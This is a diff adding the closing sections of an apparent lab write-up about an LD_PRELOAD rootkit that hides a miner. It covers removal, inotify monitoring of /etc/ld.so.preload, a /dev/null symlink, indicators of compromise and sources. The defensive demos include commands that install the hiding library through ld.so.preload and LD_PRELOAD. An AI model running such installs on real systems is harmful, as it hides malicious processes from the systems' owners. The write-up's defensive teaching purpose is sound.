+        <p>Three moves, in order: remove the implant, watch the door it came through, and narrow the door. Each is presented as one way, not the way.</p>
+        <h3>1. Mitigate: remove it</h3>
+        <p>Kill the payload, delete the preload file, delete the library, then re-run the cross-view check. Confirm the views agree again: <span class="cmd">deepscan</span> reports nothing and <span class="cmd">ls /tmp</span> shows the directory. On a real box this is also where you sweep the other persistence routes the file does not cover (cron, systemd units, shell profiles) and consider the box compromised until rebuilt, because a rootkit is evidence of root access, not the extent of it.</p>
+      </div>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">remove and verify</span><button class="copy-btn" data-copy="pkill -x ghost-miner&#10;rm -f /etc/ld.so.preload /tmp/ghost-ops/libghost.so&#10;./deepscan&#10;ls /tmp | grep ghost || echo &quot;views agree: nothing hidden&quot;">Copy</button></div>
+<pre><code>pkill -x ghost-miner
+rm -f /etc/ld.so.preload /tmp/ghost-ops/libghost.so
+./deepscan
+ls /tmp | grep ghost || echo "views agree: nothing hidden"</code></pre>
+      </div>
+      <div class="prose">
+        <h3>2. Monitor: trip the install route</h3>
+        <p>The attack needs one file write. A watcher on <span class="cmd">/etc/ld.so.preload</span> turns that write into an alert the moment it happens. D3FEND names this <a href="https://d3fend.mitre.org/technique/d3f:FileIntegrityMonitoring/">File Integrity Monitoring (D3-FIM)</a>: detecting suspicious changes to files, and <a href="https://d3fend.mitre.org/technique/d3f:SystemFileAnalysis/">System File Analysis (D3-SFA)</a>: monitoring system files for tampering. The lab version below is a minimal D3-FIM for one file; production versions cover the whole set of loader and library paths.</p>
+      </div>
+      <figure class="recording">
+        <video controls preload="metadata" poster="../../assets/vid/rootkit-watch.jpg" src="../../assets/vid/rootkit-watch.mp4"></video>
+        <figcaption><span class="rec-dot"></span>Countermeasure, recorded live <span class="dur">00:10</span><span class="recording-cap">The inotify watcher reports real MODIFY events the instant /etc/ld.so.preload changes. No extra packages, just the kernel API.</span></figcaption>
+      </figure>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">watch the loader config</span><button class="copy-btn" data-copy="touch /etc/ld.so.preload&#10;./watch /etc/ld.so.preload &amp;&#10;echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload">Copy</button></div>
+<pre><code>touch /etc/ld.so.preload
+./watch /etc/ld.so.preload &amp;
+echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload</code></pre>
+      </div>
+      <div class="prose">
+        <p>The watcher prints timestamped <span class="cmd">MODIFY</span> lines the instant the file changes. Honest limit: this catches the <span class="cmd">/etc/ld.so.preload</span> route. It does not catch kernel rootkits, patched binaries, or any install path that avoids this file. Monitor the door you know; do not claim the building.</p>
+        <h3>3. Prevent: narrow the route</h3>
+        <p>Point <span class="cmd">/etc/ld.so.preload</span> at <span class="cmd">/dev/null</span>. Writes to the path then go nowhere: the install command exits 0 and stores zero bytes. D3FEND's <a href="https://d3fend.mitre.org/technique/d3f:LocalFilePermissions/">Local File Permissions (D3-LFP)</a> is the general form of this move: controlling which principals can write security-sensitive files, so the install route is closed by policy rather than by luck.</p>
+      </div>
+      <figure class="recording">
+        <video controls preload="metadata" poster="../../assets/vid/rootkit-prevent.jpg" src="../../assets/vid/rootkit-prevent.mp4"></video>
+        <figcaption><span class="rec-dot"></span>Countermeasure, recorded live <span class="dur">00:17</span><span class="recording-cap">The symlink eats the install: zero bytes stored. But an environment-local LD_PRELOAD still hides the directory, which the recording shows honestly.</span></figcaption>
+      </figure>
+      <div class="codeblock">
+        <div class="codeblock-head"><span class="codeblock-title">symlink the preload path to /dev/null</span><button class="copy-btn" data-copy="ln -sf /dev/null /etc/ld.so.preload&#10;echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload&#10;wc -c /etc/ld.so.preload">Copy</button></div>
+<pre><code>ln -sf /dev/null /etc/ld.so.preload
+echo /tmp/ghost-ops/libghost.so &gt; /etc/ld.so.preload
+wc -c /etc/ld.so.preload</code></pre>
+      </div>
+      <div class="prose">
+        <p><span class="cmd">wc -c</span> reports 0. The system-wide route is closed. Now the honest part, shown in the recording: <span class="cmd">LD_PRELOAD=/tmp/ghost-ops/libghost.so ls /tmp</span> still hides the directory, because the environment variable route never touches the file. And root can delete the symlink. This control narrows one route; it does not solve rootkits. For the library file itself, D3FEND adds <a href="https://d3fend.mitre.org/technique/d3f:FileAnalysis/">File Analysis (D3-FA)</a> and <a href="https://d3fend.mitre.org/technique/d3f:FileHashing/">File Hashing (D3-FH)</a>: inspect any unknown <span class="cmd">.so</span> found on the loader path and compare its hash against a known-good baseline, so a dropped library is evidence even when no process visibly loads it.</p>
+      </div>
+      <div class="verdict">
+        <p class="verdict-label">Countermeasures verdict</p>
+        <p>Removal works, monitoring the loader config catches this install route the instant it is used, and the <span class="cmd">/dev/null</span> symlink closes that route for non-root writers. None of them survive a root attacker who knows they exist. Say the limits out loud: containment, trusted recovery media, and a clean rebuild are the real answer to a rooted box.</p>
+      </div>
+    </section>
+
+    <section id="debrief" data-phase="debrief">
+      <h2><span class="phase-num">06</span>Debrief</h2>
+      <div class="prose">
+        <p class="takeaway">Your tools report what the C library tells them. Verify through a second path that does not trust the first.</p>
+        <h3>IOCs: what to check on a suspect box</h3>
+      </div>
+      <ul class="checklist">
+        <li><span class="cmd">/etc/ld.so.preload</span> exists, is non-empty, or points at an unfamiliar library</li>
+        <li>Processes visible via raw <span class="cmd">getdents64</span> enumeration but absent from <span class="cmd">ps</span> / <span class="cmd">pgrep</span></li>
+        <li>Files or directories present via direct lookup but missing from <span class="cmd">ls</span></li>
+        <li>Unfamiliar <span class="cmd">.so</span> files on the loader path; hash them against a known-good baseline</li>
+        <li><span class="cmd">LD_PRELOAD</span> set in unexpected environments (service files, cron, shell profiles)</li>
+      </ul>
+      <div class="prose">
+        <h3>Reproducibility checklist</h3>
+      </div>
+      <ul class="checklist">
+        <li>Ubuntu 24.04.5 LTS, <span class="cmd">gcc</span> 13, x86-64. Lab verified 2026-09-15.</li>
+        <li>All four recordings are real executions on that platform, not simulations.</li>
+        <li>Run in a disposable container or VM. You need root for the preload steps.</li>
+        <li>Cleanup: kill the miner, remove <span class="cmd">/etc/ld.so.preload</span> and the library, re-run <span class="cmd">deepscan</span> until the views agree.</li>
+      </ul>
+      <div class="prose">
+        <h3>Sources</h3>
+        <ul>
+          <li><a href="https://attack.mitre.org/techniques/T1014/">MITRE ATT&amp;CK T1014: Rootkit</a></li>
+          <li><a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so(8): the dynamic loader and /etc/ld.so.preload</a></li>
+          <li><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">getdents64(2): the raw directory-entry syscall</a></li>
+          <li><a href="https://man7.org/linux/man-pages/man3/dlsym.3.html">dlsym(3): RTLD_NEXT interposition</a></li>
+          <li><a href="https://man7.org/linux/man-pages/man7/inotify.7.html">inotify(7): filesystem event monitoring</a></li>
+          <li><a href="https://d3fend.mitre.org/">MITRE D3FEND</a>: <a href="https://d3fend.mitre.org/technique/d3f:FileIntegrityMonitoring/">D3-FIM</a>, <a href="https://d3fend.mitre.org/technique/d3f:SystemFileAnalysis/">D3-SFA</a>, <a href="https://d3fend.mitre.org/technique/d3f:LocalFilePermissions/">D3-LFP</a>, <a href="https://d3fend.mitre.org/technique/d3f:FileAnalysis/">D3-FA</a>, <a href="https://d3fend.mitre.org/technique/d3f:FileHashing/">D3-FH</a></li>
+        </ul>
+      </div>
+      <a class="next-file" href="../../index.html"><span class="next-file-label">Next file</span><span class="next-file-title">GH-003: in preparation &rarr;</span></a>
+    </section>
+  </div>
+</main>
+
+<footer class="site-footer">
+  <p>GHOSTLIGHT is an independent research publication. Techniques are documented for defensive study on isolated lab systems.</p>
+  <p class="footer-note">One implementation, one resolution, among many. Verify everything yourself.</p>
+</footer>
+
+<script src="../../assets/site.js?v=b8843f93"></script>
+</body>
+</html>
